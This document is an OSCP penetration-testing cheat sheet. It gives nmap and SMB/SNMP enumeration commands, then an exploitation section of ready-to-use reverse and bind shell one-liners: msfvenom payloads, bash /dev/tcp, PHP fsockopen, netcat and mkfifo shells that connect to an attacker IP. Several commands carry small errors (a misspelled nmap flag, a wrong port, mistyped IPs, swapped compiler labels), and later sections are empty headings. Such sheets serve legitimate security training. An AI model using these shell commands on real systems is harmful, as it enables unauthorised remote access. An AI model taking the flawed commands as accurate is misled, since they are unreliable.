# OSCP Cheat Sheet

## Enumeration/Scanning
https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html

### TCP Scan
`nmap -sC -sV -O [ip]`

`unicornscan [ip]:1-65535`


### UDP Scan
`nmap [ip] -sU`

`unicornscan -mU -v -I [ip]`


### FTP (21)
`nmap -p 21 [ip] --script=ftp-anon`

`nmap -p 21 [ip] --script=ftp-brute`

`nmap -p 21 [ip] --scipt=ftp*`


### SMTP (25)
`nmap –script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 [ip]`

`telnet [ip] 25`


### HTTP/HTTPS (80/443)
`nikto -h [ip]`

`dirbuster`

`robots.txt`


#### Wordpress
`nmap -p 80,443 [ip] --script=wordpress*`


### Kerberos (88)
MS14-068

### Pop3 (110)
`telnet [ip] 110`

`USER [username]`

`PASS [password]`

`LIST`

`RETR`

`QUIT`


### RPCBind (111)
`rpcinfo -p [ip]`

`rpcbind -p [ip]`


### SMB/Samba (139, 455)
`nmap -p 139,445 [ip] --script=smb-enum*`

`nmap -p 139,445 [ip] --script=smb-os-discovery`

`nmap -p 139,445 [ip] --script=smb-vuln*`

`enum4linux -a [-u username] [-p password] [ip]`

`smbmap [-u username] [-p password] [ip]`

`smbclient -L \\\\[ip]\\[share]`

`nmblookup -A [ip]`

#### What we're looking for
- Misconfigurations in permissions of shares (Null sessions or read and/or write access)
- Sensitive information that can be levereged elsewhere (credentials or version number)

#### Resources

##### Spreadsheet Checklist
https://docs.google.com/spreadsheets/d/1F9wUdEJv22HdqhSn6hy-QVtS7eumgZWYYrD-OSi6JOc/edit#gid=2080645025

##### Gitlab Checklist
https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html#checklist

##### Hacking Articles SMB
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/


### SNMP (161)
`snmpwalk -c public -v1 [ip]`

`snmpcheck -t [ip] -c public`

`onesixtyone -c names -i hosts`

`snmpenum -t [ip]`



## Exploitation
https://sushant747.gitbooks.io/total-oscp-guide/exploiting.html

### Shells

#### Msfvenom

##### Meterpreter Usage
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.101 LPORT=445 -f exe -o shell_reverse.exe`

`use exploit/multi/handler`

`set payload windows/meterpreter/reverse_tcp`


##### Non-staged Payload
`msfvenom -p windows/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [exe/php/sh] -o shell_reverse_tcp.[ext]`

`msfvenom -p linux/x86/shell_reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [exe/php/sh] -o shell_reverse_tcp.[ext]`


##### Staged Payload
`msfvenom -p windows/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [format] -o staged_reverse_tcp.[ext]`

`msfvenom -p linux/x86/shell/reverse_tcp LHOST=196.168.0.101 LPORT=445 -f [format] -o staged_reverse_tcp.[ext]`


#### Bash
`0<&196;exec 196<>/dev/tcp/192.168.1.101/80; sh <&196 >&196 2>&196`

`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`


#### PHP
`php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`


#### Netcat

##### Linux
Bind - `nc -vlp 5555 -e /bin/bash`

Reverse - `nc 192.168.1.101 5555 -e /bin/bash`

Without -e flag - `rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p`

##### Windows
Bind - `nc.exe -nlvp 4444 -e cmd.exe`

Reverse - `nc.exe 192.168.1.101 443 -e cmd.exe`


#### OpenBSD
`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f`


### Editing Exploits
Common problems are incorrect payload or return address

### Compiling Windows Exploits
64-bit - `i686-w64-mingw32-gcc exploit.c -o exploit`

32-bit - `i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32`

## File Transfer

### tFTP
`mkdir /tftp`

`atftpd --daemon --port 69 /tftp`

### FTP
`apt-get update && apt-get install pure-ftpd`

`./setup-ftp.sh`

### VBS (Windows)


### PowerShell


### Linux


### Debug

## Password Cracking

## Tunneling and Port Forwarding

## Privilege Escalation

## Buffer Overflow
